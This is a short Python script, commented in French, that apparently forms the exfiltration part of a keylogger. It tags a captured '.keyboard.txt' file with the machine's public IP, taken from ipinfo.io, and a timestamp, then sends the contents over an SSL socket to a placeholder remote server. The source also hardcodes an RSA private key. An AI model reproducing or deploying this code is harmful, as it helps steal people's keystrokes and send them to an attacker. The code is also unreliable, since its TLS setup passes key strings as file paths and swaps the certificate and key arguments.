import socket
import os
import ssl
import requests
import time
from datetime import datetime


PRIVATE_KEY_CLIENT = """-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgHM9/fIcEDaQLk5F0N5BR009NGTFK2lmHSU7nLo7Y03BGgouoyXW
GjakY+kRUuHrARXAjyJQJHB/XyZzwuDSOYMSAgKfpsBuuCO+qERX30jYKo/dz2K1
K441iwX09xrlelj1gvSARte0oMj497RYogQU/JZ2G5uvHNkCfswF1r3TAgMBAAEC
gYAKay9bRSg+FpjpIKy6e0Jb/E2RUrYTCFVYOWR4/ceDjxKwmvjLAelKyV/zAUrx
+9IUSl1mZ8JznUBX9J1IwBjM3l8gAQjX+52YeM8Q1AG+xR1Dl+SDYRuxffkKAds8
l68OFsr4RUFSOvtDBT6QnbzerTsOTJcoRvTOv0V06Eg2IQJBAMbMzQoiaXIhcSpa
b3sCUqjdKDlIhYfk57135ZRWXSmWSBsXm3g/MxRK9MQVgmOnXqJW0f6BVqDmJge7
mU2u6tECQQCUZn3yzpF4AV8LDmBfzEsipC04az48Twy17IAgzQ1H8G7Kj1YVZfxS
q+WNxxxMGym+GRtI62rxZB9LowBaAL9jAkAm42EonlqqLMiKVG6CTY4F4l0/92PH
lYuPkKikP9Cxleg9BH0xJIvFaHRA90QuYkssznb9pidgCiVeVeBDRfhBAkAC1cJq
NRAKXtxV9bxZmCmHS+OhREs4E7qGbzIzbjdmvG0haYOXfQ9I9Qe5oagkvBAcFZaz
2et9GRCP/VkwXvtJAkEAmKLnxFQgw+nWYYVfkjbgvd4Uq2RaOUwhiL65qlR36lbQ
Rbxo7Cm7Ypyb0EPixjLAmdL8r7k9AusrZIE2RbFnUw==
-----END RSA PRIVATE KEY-----
"""
PUBLIC_KEY_CLIENT = """-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHM9/fIcEDaQLk5F0N5BR009NGTF
K2lmHSU7nLo7Y03BGgouoyXWGjakY+kRUuHrARXAjyJQJHB/XyZzwuDSOYMSAgKf
psBuuCO+qERX30jYKo/dz2K1K441iwX09xrlelj1gvSARte0oMj497RYogQU/JZ2
G5uvHNkCfswF1r3TAgMBAAE=
-----END PUBLIC KEY-----
"""

# Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

# Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
def send_file_securely(file_path, server_address, server_port):
    # Créer une socket TCP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Créer un contexte SSL
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=PRIVATE_KEY_CLIENT, keyfile=PUBLIC_KEY_CLIENT)

    # Établir une connexion sécurisée avec le serveur
    secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)

    try:
        # Se connecter au serveur
        secure_socket.connect((server_address, server_port))

        # Envoyer le nom du fichier au serveur
        filename = get_filename()
        secure_socket.send(filename.encode())

        # Envoyer le contenu du fichier au serveur
        with open(file_path, "r") as file:
            file_data = file.read()
            secure_socket.sendall(file_data.encode())

        print("Fichier envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")
    finally:
        # Fermer la connexion
        secure_socket.close()

if __name__ == "__main__":
    # Fichier à envoyer
    file_to_send = "chemin_du_fichier.txt"

    # Adresse du serveur
    server_address = "adresse_du_serveur"

    # Port du serveur
    server_port = 12345

    # Envoyer le fichier de manière sécurisée au serveur
    send_file_securely(file_to_send, server_address, server_port)
